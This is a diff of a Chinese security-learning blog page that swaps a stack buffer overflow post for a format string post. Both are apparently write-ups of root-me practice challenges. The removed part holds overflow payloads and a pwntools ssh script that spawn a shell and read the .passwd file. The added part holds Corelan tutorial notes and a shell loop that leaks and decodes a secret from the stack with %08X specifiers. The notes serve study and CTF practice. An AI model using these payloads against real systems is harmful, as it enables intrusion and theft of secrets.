@@ -26,21 +26,24 @@
     var CONFIG = {"hostname":"finsenty54.github.io","root":"/","scheme":"Mist","version":"8.0.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
 
-  <meta name="description" content="Sploitfun-Classic Stack Based Buffer Overflowsudo bash -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;关闭ASLR具体可见https:&#x2F;&#x2F;blog.csdn.net&#x2F;Plus_RE&#x2F;article&#x2F;details&#x2F;79199772 gcc  -pie      Cre">
+  <meta name="description" content="Z3::  big 表示大端序 即末尾放在高地址处 即顺序保持不变地址：0x804810: – : 0x804820 Exploit writing tutorial part 1 : Stack Based Overflowsax 16位al 8位 mov     rax, [rbp+var_E0] ；rax&#x3D;0xc8    0xdf    0xff    0xff    0xff    0x7">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PWN keep going">
-<meta property="og:url" content="http://finsenty54.github.io/2020/11/10/PWN_keep_going/index.html">
+<meta property="og:title" content="Format string bug basic 1">
+<meta property="og:url" content="http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/index.html">
 <meta property="og:site_name" content="FINSENTY54">
-<meta property="og:description" content="Sploitfun-Classic Stack Based Buffer Overflowsudo bash -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;关闭ASLR具体可见https:&#x2F;&#x2F;blog.csdn.net&#x2F;Plus_RE&#x2F;article&#x2F;details&#x2F;79199772 gcc  -pie      Cre">
+<meta property="og:description" content="Z3::  big 表示大端序 即末尾放在高地址处 即顺序保持不变地址：0x804810: – : 0x804820 Exploit writing tutorial part 1 : Stack Based Overflowsax 16位al 8位 mov     rax, [rbp+var_E0] ；rax&#x3D;0xc8    0xdf    0xff    0xff    0xff    0x7">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-11-10T01:33:50.000Z">
-<meta property="article:modified_time" content="2020-11-11T01:25:17.194Z">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/17/DVLAYV.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/11/17/DVLc6g.png">
+<meta property="article:published_time" content="2020-11-17T08:00:33.000Z">
+<meta property="article:modified_time" content="2020-11-17T08:01:53.892Z">
 <meta property="article:author" content="finsenty54">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.ax1x.com/2020/11/17/DVLAYV.png">
 
 
-<link rel="canonical" href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/">
+<link rel="canonical" href="http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/">
 
 
 <script class="page-configurations">
@@ -53,7 +56,7 @@
   };
 </script>
 
-  <title>PWN keep going | FINSENTY54</title>
+  <title>Format string bug basic 1 | FINSENTY54</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=UA-135283153-1"></script>
     <script>
@@ -229,7 +232,7 @@
 
       <!--noindex-->
       <section class="post-toc-wrap sidebar-panel">
-          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow"><span class="nav-number">1.</span> <span class="nav-text">Sploitfun-Classic Stack Based Buffer Overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF-x86-Stack-buffer-overflow-basic-1"><span class="nav-number">2.</span> <span class="nav-text">ELF x86 - Stack buffer overflow basic 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#64-Bits-Linux-Stack-Based-Buffer-Overflow"><span class="nav-number">2.1.</span> <span class="nav-text">64 Bits Linux Stack Based Buffer Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80"><span class="nav-number">2.1.1.</span> <span class="nav-text">地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#leave%E5%92%8Cret"><span class="nav-number">2.1.2.</span> <span class="nav-text">leave和ret</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E8%83%BD%E6%8E%A7%E5%88%B6RIP"><span class="nav-number">2.1.3.</span> <span class="nav-text">不能控制RIP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8F%E7%AB%AF%E5%BA%8F"><span class="nav-number">2.1.4.</span> <span class="nav-text">小端序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC%E5%88%B0%E7%94%A8%E6%88%B7%E6%8E%A7%E5%88%B6%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">2.1.5.</span> <span class="nav-text">跳转到用户控制的地址</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-writing-tutorial-part-1-Stack-Based-Overflows"><span class="nav-number">1.</span> <span class="nav-text">Exploit writing tutorial part 1 : Stack Based Overflows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E7%A1%AE%E5%AE%9A%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.1.</span> <span class="nav-text">寻找确定位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%85%E7%90%86%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.</span> <span class="nav-text">清理函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%B3%E8%BD%AC"><span class="nav-number">1.3.</span> <span class="nav-text">跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NULL-%E5%AD%97%E8%8A%82"><span class="nav-number">1.4.</span> <span class="nav-text">NULL 字节</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ELF-x86-Format-string-bug-basic-1"><span class="nav-number">2.</span> <span class="nav-text">ELF x86 - Format string bug basic 1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%A0%88%E9%87%8C%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">2.1.</span> <span class="nav-text">查看栈里的内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AE%B9"><span class="nav-number">2.2.</span> <span class="nav-text">查看任意地址内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E4%BD%AC%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">2.3.</span> <span class="nav-text">大佬的方法</span></a></li></ol></li></ol></div>
       </section>
       <!--/noindex-->
 
@@ -308,7 +311,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/11/10/PWN_keep_going/">
+    <link itemprop="mainEntityOfPage" href="http://finsenty54.github.io/2020/11/17/Format_string_bug_basic%201/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://media.giphy.com/media/5xtDarHBDofiI04yE4U/giphy.gif">
@@ -324,7 +327,7 @@
     
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          PWN keep going
+          Format string bug basic 1
         </h1>
 
         <div class="post-meta-container">
@@ -334,16 +337,10 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2020-11-10 09:33:50" itemprop="dateCreated datePublished" datetime="2020-11-10T09:33:50+08:00">2020-11-10</time>
+      <time title="创建时间：2020-11-17 16:00:33 / 修改时间：16:01:53" itemprop="dateCreated datePublished" datetime="2020-11-17T16:00:33+08:00">2020-11-17</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-11-11 09:25:17" itemprop="dateModified" datetime="2020-11-11T09:25:17+08:00">2020-11-11</time>
-      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
@@ -355,7 +352,7 @@
     </span>
 
   
-    <span id="/2020/11/10/PWN_keep_going/" class="post-meta-item leancloud_visitors" data-flag-title="PWN keep going" title="阅读次数">
+    <span id="/2020/11/17/Format_string_bug_basic%201/" class="post-meta-item leancloud_visitors" data-flag-title="Format string bug basic 1" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -370,8 +367,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2020/11/10/PWN_keep_going/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/10/PWN_keep_going/" itemprop="commentCount"></span>
+    <a title="valine" href="/2020/11/17/Format_string_bug_basic%201/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/11/17/Format_string_bug_basic%201/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -383,7 +380,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>3.4k</span>
+      <span>3.3k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -401,64 +398,64 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="Sploitfun-Classic-Stack-Based-Buffer-Overflow"><a href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow" class="headerlink" title="Sploitfun-Classic Stack Based Buffer Overflow"></a>Sploitfun-Classic Stack Based Buffer Overflow</h2><p><code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code><br>关闭ASLR<br>具体可见<a target="_blank" rel="noopener" href="https://blog.csdn.net/Plus_RE/article/details/79199772">https://blog.csdn.net/Plus_RE/article/details/79199772</a></p>
-<p><code>gcc  -pie      </code>Create a dynamically linked position independent executable.<br>Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作</p>
-<pre><code>gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</code></pre>
+        <p>Z3::  big 表示大端序 即末尾放在高地址处 即顺序保持不变<br>地址：0x804810: – : 0x804820</p>
+<h2 id="Exploit-writing-tutorial-part-1-Stack-Based-Overflows"><a href="#Exploit-writing-tutorial-part-1-Stack-Based-Overflows" class="headerlink" title="Exploit writing tutorial part 1 : Stack Based Overflows"></a><a target="_blank" rel="noopener" href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" title="Exploit writing tutorial part 1 : Stack Based Overflows">Exploit writing tutorial part 1 : Stack Based Overflows</a></h2><p><code>ax</code> 16位<br><code>al</code> 8位</p>
+<pre><code>mov     rax, [rbp+var_E0] ；rax=0xc8    0xdf    0xff    0xff    0xff    0x7f
+mov     rax, [rax] ; rax=0x7fffffffe2f4
+mov     [rbp+input], rax ;
+mov     rax, [rbp+input] ; rax=0x7fffffffe2f4
+mov     rdi, rax        ; s
+call    _strlen</code></pre>
 <a id="more"></a>
-<p>加上<code>-g</code>选项以后，gcc在编译是会做以下额外的操作：</p>
-<ol>
-<li>创建符号表，符号表包含了程序中使用的变量名称的列表。</li>
-<li>关闭所有的优化机制，以便程序执行过程中严格按照原来的C代码进行。</li>
-</ol>
-<p><code>-z execstack </code>禁用NX保护</p>
-<p>详细的保护机制讲解<br><a target="_blank" rel="noopener" href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
-<p><code>gdb -q</code><br>  -q, –quiet, –silent<br>                     Do not print version number on startup.</p>
-<pre><code>gdb-peda$ r `python -c &#39;print &quot;A&quot;*300&#39;`
+<h3 id="寻找确定位置"><a href="#寻找确定位置" class="headerlink" title="寻找确定位置"></a>寻找确定位置</h3><p><code>msf-pattern_create -l 5000</code><br>At this time, eip contains <code>0x356b4234</code> (note : little endian : we have overwritten EIP with 34 42 6b 35 = <code>4Bk5</code></p>
+<p><code>msf-pattern_offset 0x356b4234 5000</code><br>计算pattern 偏移值</p>
+<p><code>1094</code>. That’s the <code>buffer length needed</code> to overwrite EIP. So if you create a file with <code>25000+1094 A’s</code>, and then add <code>4 B’s (42 42 42 42 in hex)</code><br><code>EIP</code> should contain <code>42 42 42 42</code>.</p>
+<hr>
+<h3 id="清理函数"><a href="#清理函数" class="headerlink" title="清理函数"></a>清理函数</h3><p>POP 出下一跳地址后， ESP 不是指向<code>”下一个栈地址“</code><br>·ESP从模式的第5个字符开始，而不是第一个字符。<br>·（由于调用约定，当将参数传递给子函数时，<code>子函数将清理父函数使用的堆栈空间</code>，所以造成ESP不是指向下一个栈地址）</p>
+<hr>
+<h3 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h3><p>将EIP 写为指向jmp esp的地址，shellcode写在esp指向的地址处</p>
+<p>windbg::<br>s 01b10000 l 01fdd000 ff e4<br>search 在这之间寻找机器码为 <code>ff e4</code> 的指令</p>
+<hr>
+<h3 id="NULL-字节"><a href="#NULL-字节" class="headerlink" title="NULL 字节"></a>NULL 字节</h3><p>The <code>null byte</code> would become <code>a string terminator</code> and the<code> rest of the buffer data</code> will become <code>unusable</code>)</p>
+<p>Alternatively, you can split up your shellcode in smaller ‘eggs’ and use a technique called ‘egg-hunting’ to reassemble the shellcode before executing it.</p>
+<h2 id="ELF-x86-Format-string-bug-basic-1"><a href="#ELF-x86-Format-string-bug-basic-1" class="headerlink" title="ELF x86 - Format string bug basic 1"></a>ELF x86 - Format string bug basic 1</h2><p><a target="_blank" rel="noopener" href="http://showlinkroom.me/2017/01/28/pwn-learn-printf/">http://showlinkroom.me/2017/01/28/pwn-learn-printf/</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|   符号           |       作用               |</span><br><span class="line"><span class="selector-tag">-----------------------------------------------</span></span><br><span class="line">|    %d            |  十进制有符号整数         |</span><br><span class="line">|    %u            |  十进制无符号整数         |</span><br><span class="line">|    %f            |  浮点数                  |</span><br><span class="line">|    %s            |  字符串                  |</span><br><span class="line">|    %c            |  单个字符                |</span><br><span class="line">|    %p            |  指针的值                |</span><br><span class="line">|    %e            |  指数形式的浮点数         |</span><br><span class="line">|    %x            |  无符号以十六进制表示的整数|</span><br><span class="line">|    %o            |  无符号以八进制表示的整数  |</span><br><span class="line">|    %g            |  自动选择合适的表示法     |  </span><br><span class="line">|    %n            |  将printf之前已经输出的字符串个数赋给指定参数（此时参数提供地址）|</span><br></pre></td></tr></table></figure>
 
-gdb-peda$ help p</code></pre>
-<p>Print value of expression EXP.</p>
-<pre><code>gdb-peda$ p/x $rip</code></pre>
-<p><strong>这个教程太老了，还是32位上的</strong></p>
 <hr>
-<p>*经典root-me *</p>
-<h2 id="ELF-x86-Stack-buffer-overflow-basic-1"><a href="#ELF-x86-Stack-buffer-overflow-basic-1" class="headerlink" title="ELF x86 - Stack buffer overflow basic 1"></a>ELF x86 - Stack buffer overflow basic 1</h2><h3 id="64-Bits-Linux-Stack-Based-Buffer-Overflow"><a href="#64-Bits-Linux-Stack-Based-Buffer-Overflow" class="headerlink" title="64 Bits Linux Stack Based Buffer Overflow"></a>64 Bits Linux Stack Based Buffer Overflow</h3><h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p> So memory addresses are <code>64 bits</code> long, but <code>user space </code>only uses<br>the <code>first 47 bits</code>; keep this in mind because if you specified an<br>address greater than<code> 0x00007fffffffffff</code>, you’ll raise an <code>exception</code>. So<br>that means that 0x4141414141414141 will raise exception, but the<br>address <code>0x0000414141414141</code> is safe. </p>
-<pre><code>64位下，用户空间只用低47位，所以不要超过0x00007fffffffffff</code></pre>
+<p>题目源码</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">        FILE *secret = fopen(<span class="string">&quot;/challenge/app-systeme/ch5/.passwd&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">32</span>];</span><br><span class="line">        fgets(buffer, <span class="keyword">sizeof</span>(buffer), secret);</span><br><span class="line">        <span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">        fclose(secret);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <hr>
-<pre><code>$./vuln $(python -c &#39;print &quot;A&quot;*300&#39;)
+<p><code>printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);</code></p>
+<p>Because <code>‘%s’</code> displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to readfrom anillegal address, which is not mapped.</p>
+<pre><code>printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);
+stack top. . .&lt;&amp;a&gt;&lt;a&gt;&lt;i&gt;A. . .stack bottom</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DVLAYV"><img src="https://s3.ax1x.com/2020/11/17/DVLAYV.png" alt="DVLAYV.png"></a></p>
+<p>可以直接读栈里的内容</p>
+<hr>
+<h3 id="查看栈里的内容"><a href="#查看栈里的内容" class="headerlink" title="查看栈里的内容"></a>查看栈里的内容</h3><p><code>printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);</code><br>This works, because we instruct the <code>printf-</code>function to retrieve <code>five parameters</code> from the stack and display them as 8-digit padded hexadecimalnumbers. So a possible output may look like:<code>40012980.080628c4.bffff7a4.00000005.08059c04</code></p>
+<h3 id="查看任意地址内容"><a href="#查看任意地址内容" class="headerlink" title="查看任意地址内容"></a>查看任意地址内容</h3><p>%s  string ((const) (unsigned) char *) reference<br>‘％s’参数恰好做到了，它显示了堆栈提供的地址中的内存。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/DVLc6g"><img src="https://s3.ax1x.com/2020/11/17/DVLc6g.png" alt="DVLc6g.png"></a></p>
+<hr>
+<p>当我在GDB中执行fgets()的时候。<br>but if we try to debug the programm with GDB, we get a <code>permission denied</code> on the <code>fgets() call</code>…</p>
+<pre><code>gdb-peda$ help telescope 
+Display memory content at an address with smart dereferences
+Usage:
+    telescope [linecount] (analyze at current $SP)
+    telescope address [linecount]</code></pre>
+<hr>
+<h3 id="大佬的方法"><a href="#大佬的方法" class="headerlink" title="大佬的方法"></a>大佬的方法</h3><pre><code>for i in `seq 1 20`; do ~/ch5 &quot;%$i&quot;&#39;$08X&#39; ; echo; done</code></pre>
+<p>一次打印8个字节</p>
+<pre><code>for i in `seq 1 2 20`; do ./ch5 &quot;%$i&quot;&#39;$08X&#39;&quot;%$((i+1))&quot;&#39;$08X&#39;; echo; done</code></pre>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Finally, we want to</span><br><span class="line">- convert to big endian, <span class="keyword">using</span> sed -r ’s/(..)(..)(..)(..)/\<span class="number">4</span>\<span class="number">3</span>\<span class="number">2</span>\<span class="number">1</span>/g’</span><br><span class="line">- convert the hexa to printable character, <span class="keyword">using</span> xxd -r -p</span><br><span class="line">- filter non-printable charaters, <span class="keyword">using</span> strings</span><br></pre></td></tr></table></figure>
 
-gdb-peda$ x/20xg $rsp</code></pre>
-<p><del>栈从高地址往低地址方向 扩展<br>溢出的时候，字符往高地址扩展</del></p>
-<hr>
-<h4 id="leave和ret"><a href="#leave和ret" class="headerlink" title="leave和ret"></a>leave和ret</h4><pre><code>leave = mov esp,ebp ; pop ebp
-ret = pop EIP</code></pre>
-<p>leave 执行后<br><code>指向返回地址</code><br>再<code> pop 将返回地址赋给 EIP</code></p>
-<h4 id="不能控制RIP"><a href="#不能控制RIP" class="headerlink" title="不能控制RIP"></a>不能控制RIP</h4><p>So the program ends and we’re not able to control RIP:( Why?Because we  <code> override   too   much   bits</code>,   remember   biggest   address   is 0x00007fffffffffff and we try to overflow using 0x4141414141414141</p>
-<p>de08-dd00=0x108  ==264</p>
-<h4 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h4><pre><code>gdb-peda$ r $(python -c &#39;print &quot;A&quot;*264+&quot;B&quot;*6&#39;)</code></pre>
-<p><del>ASLR 开起来了</del></p>
-<p>输入是”A”*264+”ABCDEF”</p>
-<pre><code>0x7fffffffde28:    0x41    0x42    0x43    0x44    0x45    0x46    0x00    0x00</code></pre>
-<p>是<code>按序</code>填充的</p>
-<p><strong>但有因为小端序，所以又倒序读入RIP</strong><br><code>RIP: 0x464544434241 (&#39;ABCDEF&#39;)</code></p>
-<hr>
-<h4 id="跳转到用户控制的地址"><a href="#跳转到用户控制的地址" class="headerlink" title="跳转到用户控制的地址"></a>跳转到用户控制的地址</h4><p><em>（显然没有开NX）</em></p>
-<pre><code>&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdc\x90&quot;[::-1]</code></pre>
-<p><code>0x7fffffffdc90</code>buf在栈中开始地址</p>
-<p>We  need  to  reverse the  memory  address  because  it’s  a <code> little  endian architecture</code>. That’sexactly what<code>[::-1]</code>does in python.<br>[::-1]逆序</p>
-<hr>
-<p>本题考察了Unix基本输入输出流与缓冲</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">int</span> var;</span><br><span class="line">  <span class="keyword">int</span> check = <span class="number">0x04030201</span>;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line"> </span><br><span class="line">  fgets(buf,<span class="number">45</span>,<span class="built_in">stdin</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, check);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (check == <span class="number">0xdeadbeef</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...\n&quot;</span>);</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Shell closed! Bye.\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>标准输入后，还会跟上’\r\n’<br>fgets()读取45-1个字节，或者遇到’\n’停止<br>所以只是溢出4个字节即可，覆盖掉<code>check</code><br><code>0xdeadbeef</code>还需要逆序</p>
-<p><del>但我不知道unix的输入输出流</del><br>payload:(python -c ‘print “a”*40+”DEADBEEF”.decode(“hex”)[::-1]’;cat) | ./ch13<br>得到shell后：<code>cat .passwd</code></p>
-<hr>
-<p>别人使用脚本编写的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># solution by MtucX</span></span><br><span class="line"># Require pwntools</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">pwn_socket=ssh(host=&#x27;challenge02.root-me.org&#x27; ,user=&#x27;app-systeme-ch13&#x27; ,password=&#x27;app-systeme-ch13&#x27;,port=2222)</span><br><span class="line">pwned=pwn_socket.process(executable=&#x27;./ch13&#x27;)</span><br><span class="line">pwned.sendline(&#x27;A&#x27; * 40  + &#x27;\xef\xbe\xad\xde&#x27;)</span><br><span class="line">pwned.sendline(&#x27;cat .passwd&#x27;)</span><br><span class="line">pwned.interactive()</span><br></pre></td></tr></table></figure>
-<hr>
-<p>关于unix系统输入输出流<br><a target="_blank" rel="noopener" href="http://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf" title="stdio buffer">stdio buffer</a><br>参考：<a target="_blank" rel="noopener" href="http://showlinkroom.me/2017/11/20/Root-me-App-System01/">http://showlinkroom.me/2017/11/20/Root-me-App-System01/</a></p>
-<pre><code>python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; + &quot;\x00&quot;*4052 + &quot;cat .passwd&quot;&#39; | ./ch13</code></pre>
-<p>将stdin buffer填满，让数据不填入buffer中，留在外面。</p>
-<pre><code>(python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; &#39;; cat ) | ./ch13</code></pre>
-<p>不让当前的数据流中断，不会让输入流关闭的指令，直接使用cat的功能为将输入流复制到输出流中。</p>
+<p>filtering only <code>13-or-more-bytes</code> strings (<code>strings -13</code>)</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">strings <span class="number">-13</span> &lt; &lt;(<span class="keyword">for</span> i in `seq <span class="number">1</span> <span class="number">20</span>`; \</span><br><span class="line">    do ~/ch5 &quot;%$i&quot;&#x27;$08X&#x27;&quot;%$((i+1))&quot;&#x27;$08X&#x27;&quot;%$((i+2))&quot;&#x27;$08X&#x27;&quot;%$((i+3))&quot;&#x27;$08X&#x27; \</span><br><span class="line">    |sed -r &#x27;s/(..)(..)(..)(..)/\4\3\2\1/g&#x27; \</span><br><span class="line">    |xxd -r -p; echo;  done)</span><br></pre></td></tr></table></figure>
+
+<p>注：：</p>
+<pre><code>┌─[zentreisender@parrotos]─[~/Documents]
+└──╼ $strings -h
+Usage: strings [option(s)] [file(s)]
+ Display printable strings in [file(s)] (stdin by default)</code></pre>
 
     </div>
 
